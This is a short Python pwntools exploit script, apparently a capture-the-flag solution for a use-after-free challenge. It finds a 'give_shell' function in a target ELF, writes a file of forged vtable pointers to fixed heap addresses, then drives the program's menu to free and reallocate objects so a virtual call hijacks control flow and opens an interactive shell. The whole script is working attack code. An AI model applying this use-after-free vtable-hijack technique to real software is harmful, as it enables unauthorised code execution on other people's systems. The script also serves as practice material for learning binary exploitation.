#!/usr/bin/env python

import pwn
import random
import time
import argparse

parser = argparse.ArgumentParser(description="Select a filename.")
parser.add_argument("filename", type=str, help="The name of the file to process")
args = parser.parse_args()

elf = pwn.ELF(f'{args.filename}')
giveaddr = elf.functions[[function for function in elf.functions if 'give_shell' in function][0]].address

print(hex(giveaddr))
with open('data', 'wb') as fh:
  offsets = [0x404d60, 0x404d80, 0x404da0]
  random.shuffle(offsets)
  print(f"Randomly using {hex(offsets[0])}")
  fh.write(pwn.p64(offsets[0] - 8) * 6) # Write 48 bytes of the target address out

# Using ltrace we can observe the new() calls allocate 48 bytes for Humans. Since we free two, we allocate 2, and simply spam all their vtables to our target.
p = pwn.process([f'{args.filename}', '48', 'data'])
p.sendline(b'3')
p.sendline(b'2')
p.sendline(b'2')
p.sendline(b'1')
p.interactive()
